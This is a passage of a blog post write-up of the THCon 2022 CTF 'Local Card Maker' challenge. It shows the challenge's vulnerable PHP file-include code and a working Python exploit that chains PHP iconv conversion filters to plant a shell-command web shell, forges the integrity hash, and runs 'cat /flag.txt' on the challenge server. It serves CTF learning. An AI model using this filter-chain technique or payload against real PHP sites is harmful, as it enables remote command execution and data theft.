+<span class="nv">$safe_handler</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">IntegrityHandler</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">],</span> <span class="s1">'sha1'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s2">"LOCAL_ACCESS"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+
+<span class="k">function</span> <span class="n">createHeaders</span><span class="p">(</span><span class="nv">$pArray</span><span class="p">,</span> <span class="nv">$handler</span><span class="p">){</span>
+	<span class="k">echo</span> <span class="s1">'&lt;a href="/"&gt;&lt;li&gt;Home&lt;/li&gt;&lt;/a&gt;'</span><span class="p">;</span>
+	<span class="k">foreach</span><span class="p">(</span><span class="nv">$pArray</span> <span class="k">as</span> <span class="nv">$p</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">){</span>
+		<span class="k">echo</span> <span class="s2">"&lt;a href='/index.php?page="</span> <span class="mf">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="mf">.</span><span class="s2">"&amp;pHash="</span> <span class="mf">.</span> <span class="nv">$handler</span><span class="o">-&gt;</span><span class="nf">secure_data</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$p</span><span class="p">))</span> <span class="mf">.</span> <span class="s2">"' /&gt;&lt;li&gt;</span><span class="nv">$v</span><span class="s2">&lt;/li&gt;&lt;/a&gt;"</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+
+
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"css/style.css"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;title&gt;</span>Framework<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"headers"</span><span class="nt">&gt;</span>
+		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"inner_headers"</span><span class="nt">&gt;</span>
+			<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"logo_c"</span><span class="nt">&gt;</span>
+				<span class="nt">&lt;h1&gt;</span>Thcon22<span class="nt">&lt;span&gt;</span>Framework<span class="nt">&lt;/span&gt;&lt;/h1&gt;</span>
+			<span class="nt">&lt;/div&gt;</span>
+				<span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav"</span><span class="nt">&gt;</span>
+	<span class="cp">&lt;?php</span>
+	<span class="nf">createHeaders</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'change_profile'</span> <span class="o">=&gt;</span> <span class="s1">'Edit'</span><span class="p">,</span> <span class="s1">'view_profile'</span> <span class="o">=&gt;</span> <span class="s1">'View'</span><span class="p">),</span> <span class="nv">$safe_handler</span><span class="p">);</span>
+	<span class="cp">?&gt;</span>
+			<span class="nt">&lt;/ul&gt;</span>
+		<span class="nt">&lt;/div&gt;</span>
+	<span class="nt">&lt;/div&gt;</span>
+	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"blank_space"</span><span class="nt">&gt;&lt;/div&gt;</span>
+
+	<span class="cp">&lt;?php</span>
+	<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pHash'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pHash'</span><span class="p">]))</span>
+	<span class="p">{</span>
+		<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
+		<span class="nv">$hash</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pHash'</span><span class="p">];</span>
+		<span class="k">if</span><span class="p">(</span><span class="nv">$safe_handler</span><span class="o">-&gt;</span><span class="nf">handle</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nv">$hash</span><span class="p">))</span>
+		<span class="p">{</span>
+			<span class="k">include</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'.php'</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="k">else</span>
+		<span class="p">{</span>
+			<span class="k">echo</span> <span class="s2">"&lt;h2&gt;Integrity verification failed...&lt;/h2&gt;"</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+	<span class="cp">?&gt;</span>
+	<span class="nt">&lt;h1&gt;</span>Welcome to the profile editor !<span class="nt">&lt;/h1&gt;</span>
+	<span class="nt">&lt;p&gt;</span>Here you can create and edit your profile.<span class="nt">&lt;br&gt;</span> A card will be created for your Thcon22 participation.<span class="nt">&lt;br&gt;</span> We hope you will like the rendering !<span class="nt">&lt;/p&gt;</span>
+	<span class="cp">&lt;?php</span>
+	<span class="p">}</span>
+	<span class="cp">?&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Now we know for certain how files are loaded - <code class="language-plaintext highlighter-rouge">include(base64_decode($page) . '.php')</code>. We need to find a way to load <code class="language-plaintext highlighter-rouge">/flag.txt</code> even though <code class="language-plaintext highlighter-rouge">.php</code> is always appended.</p>
+
+<h2 id="getting-the-flag">Getting the Flag</h2>
+
+<p>When I participated in hxp CTF 2021 we faced <a href="https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/">a similar problem</a>, and I remember <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d"><code class="language-plaintext highlighter-rouge">loknop</code> developed a creative solution</a> using only <a href="https://www.php.net/manual/en/filters.convert.php">PHP conversion filters</a> passed to <code class="language-plaintext highlighter-rouge">include()</code> to achieve <strong>RCE</strong> (which is much more than what we need here - reading file content, but will work!). I wrote the below solution to adapt the method to this challenge:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">hashlib</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="c1"># Based on https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d (until line 52):
+</span><span class="n">conversions</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">f</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">z</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">U</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">V</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">Y</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">W</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">d</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">D</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2</span><span class="sh">'</span>
+<span class="p">}</span>
+
+<span class="c1"># Simple but does the trick
+</span><span class="n">command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">cat /flag.txt</span><span class="sh">"</span>
+
+<span class="c1">#&lt;?=`$_GET[0]`;;?&gt;
+</span><span class="n">base64_payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">PD89YCRfR0VUWzBdYDs7Pz4</span><span class="sh">"</span>
+
+<span class="c1"># generate some garbage base64
+</span><span class="n">filters</span> <span class="o">=</span> <span class="sh">"</span><span class="s">convert.iconv.UTF8.CSISO2022KR|</span><span class="sh">"</span>
+<span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.base64-encode|</span><span class="sh">"</span>
+<span class="c1"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file
+</span><span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.iconv.UTF8.UTF7|</span><span class="sh">"</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">base64_payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+        <span class="n">filters</span> <span class="o">+=</span> <span class="n">conversions</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s">|</span><span class="sh">"</span>
+        <span class="c1"># decode and reencode to get rid of everything that isn't valid base64
+</span>        <span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.base64-decode|</span><span class="sh">"</span>
+        <span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.base64-encode|</span><span class="sh">"</span>
+        <span class="c1"># get rid of equal signs
+</span>        <span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.iconv.UTF8.UTF7|</span><span class="sh">"</span>
+
+<span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.base64-decode</span><span class="sh">"</span>
+<span class="n">file_to_use</span> <span class="o">=</span> <span class="sh">"</span><span class="s">index</span><span class="sh">"</span>
+
+<span class="n">final_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">php://filter/</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s">/resource=</span><span class="si">{</span><span class="n">file_to_use</span><span class="si">}</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+
+<span class="c1"># "Local Card Maker"-specific implementation starts here:
+</span>
+<span class="n">key_salt</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Thcon_SuP3r_S3cr4t_K3y!</span><span class="sh">"</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">encodebytes</span><span class="p">(</span><span class="n">final_payload</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">""</span><span class="p">)</span>
+<span class="n">buf_hash</span> <span class="o">=</span> <span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">(</span><span class="n">key_salt</span> <span class="o">+</span> <span class="n">buf</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">())</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://challenges1.thcon.party:2001/index.php?page=%s&amp;pHash=%s&amp;0=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">buf_hash</span><span class="p">,</span> <span class="n">command</span><span class="p">)).</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The result contained the flag <code class="language-plaintext highlighter-rouge">Thcon22{_Php_&amp;nd_Ap@che_R000ck5$$_}</code> - I guess the original solution should have used Apache? 😅</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html';
+     this.page.identifier = '/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup';
+     this.page.title = 'THCon 2k22 CTF - "Local Card Maker" Writeup';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//lewin.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/03/02/bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi.html">
+            Bathroom Smart Speaker Part 2 &#8211; AirPlay to Bluetooth Speaker via Raspberry Pi
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html">
+            Winning the Impossible Race &#8211; An Unintended Solution for Includer’s Revenge / Counter (hxp 2021)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2021/09/16/bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant.html">
+            Bathroom Smart Speaker using UE Boom, Raspberry Pi, Spotify and Home Assistant
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/airplay/" class="set-1">airplay</a> <a href="/tag/api/" class="set-1">api</a> <a href="/tag/apple-music/" class="set-1">apple music</a> <a href="/tag/as3992/" class="set-1">as3992</a> <a href="/tag/bank/" class="set-1">bank</a> <a href="/tag/bidirectional/" class="set-1">bidirectional</a> <a href="/tag/bluetooth/" class="set-5">bluetooth</a> <a href="/tag/blueutil/" class="set-1">blueutil</a> <a href="/tag/bose/" class="set-1">bose</a> <a href="/tag/configuration-profile/" class="set-1">configuration profile</a> <a href="/tag/controlplane/" class="set-1">controlplane</a> <a href="/tag/crash/" class="set-1">crash</a> <a href="/tag/credit-card/" class="set-1">credit card</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/debug/" class="set-1">debug</a> <a href="/tag/dhcp/" class="set-1">dhcp</a> <a href="/tag/dns/" class="set-1">dns</a> <a href="/tag/exploit/" class="set-5">exploit</a> <a href="/tag/facebook/" class="set-1">facebook</a> <a href="/tag/finance/" class="set-1">finance</a> <a href="/tag/grpc/" class="set-1">grpc</a> <a href="/tag/grpc-java/" class="set-1">grpc-java</a> <a href="/tag/home-assistant/" class="set-5">home assistant</a> <a href="/tag/hotspot/" class="set-1">hotspot</a> <a href="/tag/hxp/" class="set-1">hxp</a> <a href="/tag/inactivity/" class="set-1">inactivity</a> <a href="/tag/iodine/" class="set-1">iodine</a> <a href="/tag/ios/" class="set-1">ios</a> <a href="/tag/ip/" class="set-1">ip</a> <a href="/tag/iphone/" class="set-1">iphone</a> <a href="/tag/jq/" class="set-1">jq</a> <a href="/tag/kernel/" class="set-1">kernel</a> <a href="/tag/lfi/" class="set-5">lfi</a> <a href="/tag/linux/" class="set-1">linux</a> <a href="/tag/lldb/" class="set-1">lldb</a> <a href="/tag/lock/" class="set-1">lock</a> <a href="/tag/mac/" class="set-1">mac</a> <a href="/tag/macbook/" class="set-1">macbook</a> <a href="/tag/manual-screensaver-cron/" class="set-1">manual-screensaver-cron</a> <a href="/tag/messenger/" class="set-1">messenger</a> <a href="/tag/nginx/" class="set-1">nginx</a> <a href="/tag/notifications/" class="set-1">notifications</a> <a href="/tag/oncompleted/" class="set-1">oncompleted</a> <a href="/tag/onerror/" class="set-1">onerror</a> <a href="/tag/pasten/" class="set-1">pasten</a> <a href="/tag/php/" class="set-5">php</a> <a href="/tag/pi-btaudio/" class="set-1">pi-btaudio</a> <a href="/tag/power-manager/" class="set-1">power manager</a> <a href="/tag/python/" class="set-1">python</a> <a href="/tag/quietcomfort/" class="set-1">quietcomfort</a> <a href="/tag/radxa-rock-pro/" class="set-1">radxa rock pro</a> <a href="/tag/raspberry-pi/" class="set-5">raspberry pi</a> <a href="/tag/raspotify/" class="set-1">raspotify</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/reddit/" class="set-1">reddit</a> <a href="/tag/rfid/" class="set-1">rfid</a> <a href="/tag/rock-pro/" class="set-1">rock pro</a> <a href="/tag/rtl8187l/" class="set-1">rtl8187l</a> <a href="/tag/screensaver/" class="set-1">screensaver</a> <a href="/tag/sha-1/" class="set-1">sha-1</a> <a href="/tag/shairport-sync/" class="set-1">shairport-sync</a> <a href="/tag/spotcast/" class="set-1">spotcast</a> <a href="/tag/spotify/" class="set-5">spotify</a> <a href="/tag/ssh/" class="set-1">ssh</a> <a href="/tag/static/" class="set-1">static</a> <a href="/tag/statusruntimeexception/" class="set-1">statusruntimeexception</a> <a href="/tag/stream/" class="set-1">stream</a> <a href="/tag/streamobserver/" class="set-1">streamobserver</a> <a href="/tag/telegram/" class="set-1">telegram</a> <a href="/tag/ubiquiti/" class="set-1">ubiquiti</a> <a href="/tag/ue-boom/" class="set-5">ue boom</a> <a href="/tag/unable-to-attach/" class="set-1">unable to attach</a> <a href="/tag/unifi/" class="set-1">unifi</a> <a href="/tag/unintended/" class="set-1">unintended</a> <a href="/tag/web/" class="set-1">web</a> <a href="/tag/webcore/" class="set-1">webcore</a> <a href="/tag/webkit/" class="set-1">webkit</a> <a href="/tag/wifi/" class="set-1">wifi</a> <a href="/tag/xcode/" class="set-1">xcode</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
